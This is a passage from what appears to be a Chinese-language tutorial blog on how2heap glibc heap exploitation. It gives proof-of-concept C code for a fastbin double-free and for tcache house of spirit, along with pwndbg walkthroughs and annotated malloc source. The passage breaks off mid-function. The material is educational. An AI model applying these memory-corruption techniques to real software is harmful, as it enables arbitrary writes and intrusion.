class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up tcache first.\n"</span>);</span><br><span class="line">	<span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试"><a href="#pwndbg调试" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>程序做了下面几件事：</p>
<ol>
<li>calloc三块内存</li>
<li>free第一块内存</li>
<li>free第二块内存</li>
<li>再次free第一块内存</li>
<li>再次calloc三块内存<br>发现：第五步malloc申请堆的时候，第一个堆申请到了free第一次的位置，第二个堆申请到了free第二次的位置，第三个堆又申请到了free了第一次的位置。</li>
</ol>
<p>由于用到了tcache bin，所以先把它填满。然后就可以用fast bin了。</p>
<p>free的过程会对free list进行检查，不能连续两次free同一个chunk，因为它在链表顶。所以在这两次free之间增加一次对其他chunk的free，这样就可以对一个chunk free两次了，因为此时它已经不在链表顶。<br>第一次free<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap1.png" alt><br>第二次free<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap2.png" alt><br>第三次free<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap3.png" alt><br>解释一下这里为什么fastbin链中存储的地址与栈中地址相差0x10，即16byte。<br>heapinfo返回的地址是包含chunk 的head data，<code>int *a = malloc(8);</code> 这里返回的是不含头的。所以差了16个字节的头部数据，8字节pre_size和8字节size。chunk最前面的16字节就是保存前面一块的大小和当前块的大小一共16字节。</p>
<p>第三次free后，看到0x20这条链中存了两个相同的地址。下面再进行calloc看看会发生什么。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap4.png" alt><br><code>0x555555756350</code>被取走了。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap5.png" alt><br><code>0x555555756370</code>被取走了。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/df_heap6.png" alt><br><code>0x555555756350</code>又被取走了。这样a和c就指向了同一块内存。</p>
<h2 id="tcache-house-of-spirit-glibc2-34"><a href="#tcache-house-of-spirit-glibc2-34" class="headerlink" title="tcache house of spirit glibc2.34"></a>tcache house of spirit glibc2.34</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>house of spirit的主要思想就是通过伪造chunk，再free掉fake_chunk使其进入tcache bin，再次malloc的时候就会将这个fake_chunk从tcache bin中申请出来。这样就可以写任意地址。</p>
<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack on tcache.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Ok. Let's start with the example!.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以把上面的源代码简化成下面的版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> fake_chunk[] = &#123;<span class="number">0</span>,<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">size_t</span> *p = &amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="keyword">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	assert(b == p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>malloc(1)</code>的作用是初始化堆，包括循环链表清空，设置fast bin的最大size等。但是在free函数进行的时候都会检查tcache bin是否需要初始化，在后面调试的过程中会看到。所以其实这一步并不必须。</p>
<h3 id="tcache-bin结构"><a href="#tcache-bin结构" class="headerlink" title="tcache bin结构"></a>tcache bin结构</h3><p>前置知识 -&gt; 空闲 chunk 管理器 -&gt; tcache bin</p>
<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>在pwndbg中调试看看。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p sizeof(size_t)</span><br><span class="line"><span class="meta">$</span>1 = 8</span><br></pre></td></tr></table></figure></p>
<p>我们只需要4个元素的8bytes类型数组即可，size_t类型的占用8字节内存。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p/x &amp;fake_chunk</span><br><span class="line"><span class="meta">$</span>3 = 0x7fffffffdaa0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x p</span><br><span class="line"><span class="meta">$</span>4 = 0x7fffffffdab0</span><br></pre></td></tr></table></figure></p>
<p>fake_chunk[1]的位置存储的信息就是chunk size，即大小。&amp;fake_chunk[2]赋值给p，即p指向fake_chunk的fd指针，实际上这里存储的值为0，但是我们可以让它有内容。<br>free(p)，跟进查看。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/spirit_free.png" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Convert a user mem pointer to a chunk address and extract the right tag.  */</span></span><br><span class="line"><span class="comment">//将p的地址转化成chunk需要的了</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/spirit_mem2chunk.png" alt><br>继续单步，发现了这个宏。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/spirit_init_tcache.png" alt><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br></pre></td></tr></table></figure></p>
<p>这里是说如果用到了tcache并且它为NULL，就进行初始化tcache。这个宏在malloc中也用到了，如果进行过malloc，那么tcache bin就会在第一次malloc时进行初始化，这里就会跳过。而我们没有malloc过，所以这里就会进行初始化。也就是说无论如何tcache bin都会进行初始化。初始化工作由tcache_init()函数完成。<br>tcache_init()函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">//获取arena</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">//这里还是在进行内存分配。如果arena分配成功，而内存分配失败，就重新获取arena与分配内存，从而确保成功。</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//释放线程锁</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="comment">//tcache分配好后，将tcache处的内存初始化为0</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/spirit_int_free.png" alt><br>这里开始正儿八经的进入free函数了。<br>其实这个函数很长，但是我们只需要其中放入tcache的部分就行。<br>完整的<code>__ini_free()</code>函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span 